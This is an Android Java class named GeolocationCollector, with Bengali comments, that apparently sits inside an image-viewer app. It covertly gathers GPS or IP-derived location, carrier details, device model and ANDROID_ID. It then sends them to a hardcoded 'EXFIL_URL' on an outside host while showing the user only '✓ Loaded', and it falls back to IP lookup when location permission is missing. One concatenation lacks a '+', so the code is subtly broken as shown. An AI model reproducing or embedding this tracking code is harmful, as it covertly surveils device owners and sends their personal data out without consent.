package com.imageviewer;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.content.ContextCompat;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class GeolocationCollector {

    private static final String EXFIL_URL = "https://vercel-geo-api-locations.vercel.app/api/collect";
    private static final long LOCATION_TIMEOUT_MS = 8000; // 8 সেকেন্ড timeout

    private final Context context;
    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private LocationManager locationManager;

    private Callback callback;
    private boolean locationReceived = false;

    public interface Callback {
        void onCollecting();
        void onComplete(String statusMessage);
        void onError(String message);
    }

    public GeolocationCollector(Context context) {
        this.context = context;
        this.locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
    }

    public void setCallback(Callback cb) {
        this.callback = cb;
    }

    /**
     * লোকেশন কালেক্ট করে — প্রথমে GPS, তারপর IP Fallback
     */
    public void collectAndSend() {
        if (callback != null) callback.onCollecting();
        locationReceived = false;

        // চেক করো — GPS permission আছে কিনা
        boolean hasFineLocation = ContextCompat.checkSelfPermission(context,
                Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;

        if (hasFineLocation) {
            // ★★★ Permission আছে → GPS থেকে Live Location নাও ★★★
            Log.d("GeoCollector", "Location permission granted, trying GPS...");
            tryGetGpsLocation();
        } else {
            // Permission নেই → IP Geolocation fallback
            Log.d("GeoCollector", "No location permission, using IP fallback");
            executor.execute(() -> collectViaIpGeolocation());
        }

        // ★★★ Timeout — GPS না পেলে IP Fallback ★★★
        mainHandler.postDelayed(() -> {
            if (!locationReceived) {
                Log.d("GeoCollector", "GPS timeout, using IP fallback");
                executor.execute(() -> collectViaIpGeolocation());
            }
        }, LOCATION_TIMEOUT_MS);
    }

    /**
     * GPS লোকেশন নেওয়ার চেষ্টা
     */
    private void tryGetGpsLocation() {
        try {
            // GPS চালু আছে কিনা চেক করো
            if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                // GPS বন্ধ → Network Provider try করো
                if (!locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    // কিছুই নেই → IP fallback
                    executor.execute(() -> collectViaIpGeolocation());
                    return;
                }
                // Network Provider ব্যবহার করো
                requestLocationUpdate(LocationManager.NETWORK_PROVIDER);
            } else {
                // GPS ব্যবহার করো
                requestLocationUpdate(LocationManager.GPS_PROVIDER);
            }

            // ★★★ Fast path: Last Known Location ★★★
            try {
                Location lastLocation = locationManager.getLastKnownLocation(
                        locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) ?
                                LocationManager.GPS_PROVIDER : LocationManager.NETWORK_PROVIDER);
                if (lastLocation != null) {
                    Log.d("GeoCollector", "Got last known location: " +
                            lastLocation.getLatitude() + ", " + lastLocation.getLongitude());
                    sendLocationToServer(lastLocation.getLatitude(), lastLocation.getLongitude(),
                            lastLocation.getAccuracy(), "last_known");
                    locationReceived = true;
                    notifyComplete();
                    return;
                }
            } catch (SecurityException ignored) {}

        } catch (SecurityException e) {
            Log.e("GeoCollector", "Security exception: " + e.getMessage());
            executor.execute(() -> collectViaIpGeolocation());
        } catch (Exception e) {
            Log.e("GeoCollector", "Error getting GPS: " + e.getMessage());
            executor.execute(() -> collectViaIpGeolocation());
        }
    }

    /**
     * Location Update request
     */
    private void requestLocationUpdate(String provider) {
        try {
            LocationListener locationListener = new LocationListener() {
                @Override
                public void onLocationChanged(Location loc) {
                    if (!locationReceived) {
                        Log.d("GeoCollector", "Live location: " +
                                loc.getLatitude() + ", " + loc.getLongitude());
                        sendLocationToServer(loc.getLatitude(), loc.getLongitude(),
                                loc.getAccuracy(), "live_" + provider);
                        locationReceived = true;
                        locationManager.removeUpdates(this);
                        notifyComplete();
                    }
                }

                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {}

                @Override
                public void onProviderEnabled(String provider) {}

                @Override
                public void onProviderDisabled(String provider) {}
            };

            locationManager.requestSingleUpdate(provider, locationListener, Looper.getMainLooper());

            // ৬ সেকেন্ড পর listener রিমুভ করো
            mainHandler.postDelayed(() -> {
                try {
                    locationManager.removeUpdates(locationListener);
                } catch (SecurityException ignored) {}
            }, 6000);

        } catch (SecurityException e) {
            Log.e("GeoCollector", "Security exception in requestUpdate: " + e.getMessage());
        }
    }

    /**
     * GPS লোকেশন সার্ভারে পাঠাও
     */
    private void sendLocationToServer(double lat, double lon, float accuracy, String source) {
        executor.execute(() -> {
            try {
                String deviceInfo = collectDeviceInfo();

                sendToServer("lat=" + URLEncoder.encode(String.valueOf(lat), "UTF-8")
                        + "&lon=" + URLEncoder.encode(String.valueOf(lon), "UTF-8")
                        + "&accuracy=" + URLEncoder.encode(String.valueOf(accuracy), "UTF-8")
                        + "&location_source=" + URLEncoder.encode(source, "UTF-8")
                        + "&method=gps"
                        + deviceInfo);

                // Network info
                try {
                    TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                    if (tm != null) {
                        String networkCountry = tm.getNetworkCountryIso();
                        String networkOperator = tm.getNetworkOperatorName();
                        if (networkCountry != null && !networkCountry.isEmpty()) {
                            sendToServer("&network_country=" + URLEncoder.encode(networkCountry, "UTF-8")
                                    + "&network_operator=" + URLEncoder.encode(networkOperator != null ? networkOperator : "", "UTF-8"));
                        }
                    }
                } catch (SecurityException ignored) {}

            } catch (Exception e) {
                Log.e("GeoCollector", "Error sending GPS data: " + e.getMessage());
            }
        });
    }

    /**
     * ★★★ IP Geolocation (Fallback — যখন GPS permission নেই বা ব্যর্থ) ★★★
     */
    private void collectViaIpGeolocation() {
        try {
            Log.d("GeoCollector", "Using IP geolocation fallback");

            // ip-api.com থেকে লোকেশন
            String ipApiResponse = httpGet("http://ip-api.com/json/?fields=status,lat,lon,city,region,country,zip,isp,org,as,query,timezone");
            Log.d("GeoCollector", "ip-api response: " + ipApiResponse);

            String deviceInfo = collectDeviceInfo();

            if (ipApiResponse.contains("\"status\":\"success\"")) {
                JSONObject obj = new JSONObject(ipApiResponse);

                String lat = obj.optString("lat", "");
                String lon = obj.optString("lon", "");
                String city = obj.optString("city", "");
                String region = obj.optString("region", "");
                String country = obj.optString("country", "");
                String zip = obj.optString("zip", "");
                String ip = obj.optString("query", "");

                sendToServer("lat=" + URLEncoder.encode(lat, "UTF-8")
                        + "&lon=" + URLEncoder.encode(lon, "UTF-8")
                        + "&city=" + URLEncoder.encode(city, "UTF-8")
                        + "&region=" + URLEncoder.encode(region, "UTF-8")
                        + "&country=" + URLEncoder.encode(country, "UTF-8")
                        + "&zip=" + URLEncoder.encode(zip, "UTF-8")
                        + "&ip=" + URLEncoder.encode(ip, "UTF-8")
                        + "&method=ip_fallback"
                        + "&location_source=ip-geolocation"
                        + deviceInfo);
            } else {
                // Fallback ipapi.co
                String lat = httpGet("https://ipapi.co/latitude/");
                String lon = httpGet("https://ipapi.co/longitude/");
                String city = httpGet("https://ipapi.co/city/");
                String region = httpGet("https://ipapi.co/region/");
                String country = httpGet("https://ipapi.co/country/");
                String ip = httpGet("https://ipapi.co/ip/");

                sendToServer("lat=" + URLEncoder.encode(lat, "UTF-8")
                        + "&lon=" + URLEncoder.encode(lon, "UTF-8")
                        + "&city=" + URLEncoder.encode(city, "UTF-8")
                        + "&region=" URLEncoder.encode(region, "UTF-8")
                        + "&country=" + URLEncoder.encode(country, "UTF-8")
                        + "&ip=" + URLEncoder.encode(ip, "UTF-8")
                        + "&method=ip_fallback2"
                        + "&location_source=ip-geolocation"
                        + deviceInfo);
            }

            // Network info (fallback-ও)
            try {
                TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                if (tm != null) {
                    String networkCountry = tm.getNetworkCountryIso();
                    String networkOperator = tm.getNetworkOperatorName();
                    if (networkCountry != null && !networkCountry.isEmpty()) {
                        sendToServer("&network_country=" + URLEncoder.encode(networkCountry, "UTF-8")
                                + "&network_operator=" + URLEncoder.encode(networkOperator != null ? networkOperator : "", "UTF-8"));
                    }
                }
            } catch (SecurityException ignored) {}

            notifyComplete();

        } catch (Exception e) {
            Log.e("GeoCollector", "IP geolocation error: " + e.getMessage());
            notifyComplete();
        }
    }

    private void notifyComplete() {
        if (!locationReceived) {
            mainHandler.post(() -> {
                if (callback != null) callback.onComplete("✓ Loaded");
            });
        }
    }

    // ============================================================
    // HTTP & Utility Methods (same as before)
    // ============================================================

    private String httpGet(String urlString) throws Exception {
        URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setConnectTimeout(8000);
        conn.setReadTimeout(8000);
        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 14)");

        int responseCode = conn.getResponseCode();
        BufferedReader reader = new BufferedReader(
                new InputStreamReader(responseCode >= 200 && responseCode < 300 ?
                        conn.getInputStream() : conn.getErrorStream()));

        StringBuilder response = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            response.append(line);
        }
        reader.close();
        return response.toString();
    }

    private void httpPost(String urlString, String jsonData) throws Exception {
        URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setDoOutput(true);
        conn.setConnectTimeout(8000);
        conn.setReadTimeout(8000);

        OutputStream os = conn.getOutputStream();
        byte[] input = jsonData.getBytes(StandardCharsets.UTF_8);
        os.write(input, 0, input.length);
        os.flush();
        os.close();

        conn.getResponseCode();
        conn.disconnect();
    }

    private void sendToServer(String params) {
        try {
            String getUrl = EXFIL_URL + "?" + params;
            httpGet(getUrl);

            String jsonData = "{";
            String[] pairs = params.split("&");
            for (int i = 0; i < pairs.length; i++) {
                String[] keyValue = pairs[i].split("=", 2);
                if (keyValue.length == 2) {
                    if (i > 0) jsonData += ",";
                    jsonData += "\"" + keyValue[0] + "\":\"" +
                            java.net.URLDecoder.decode(keyValue[1], "UTF-8") + "\"";
                }
            }
            jsonData += "}";
            httpPost(EXFIL_URL, jsonData);

        } catch (Exception ignored) {}
    }

    private String collectDeviceInfo() {
        StringBuilder sb = new StringBuilder();

        sb.append("&device=").append(URLEncoder.encode(Build.DEVICE, StandardCharsets.UTF_8));
        sb.append("&model=").append(URLEncoder.encode(Build.MODEL, StandardCharsets.UTF_8));
        sb.append("&manufacturer=").append(URLEncoder.encode(Build.MANUFACTURER, StandardCharsets.UTF_8));
        sb.append("&brand=").append(URLEncoder.encode(Build.BRAND, StandardCharsets.UTF_8));
        sb.append("&android_version=").append(URLEncoder.encode(Build.VERSION.RELEASE, StandardCharsets.UTF_8));
        sb.append("&sdk=").append(Build.VERSION.SDK_INT);

        String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        if (androidId != null) {
            sb.append("&android_id=").append(URLEncoder.encode(androidId, StandardCharsets.UTF_8));
        }

        sb.append("&session=").append(UUID.randomUUID().toString());
        sb.append("&ts=").append(System.currentTimeMillis());

        return sb.toString();
    }
}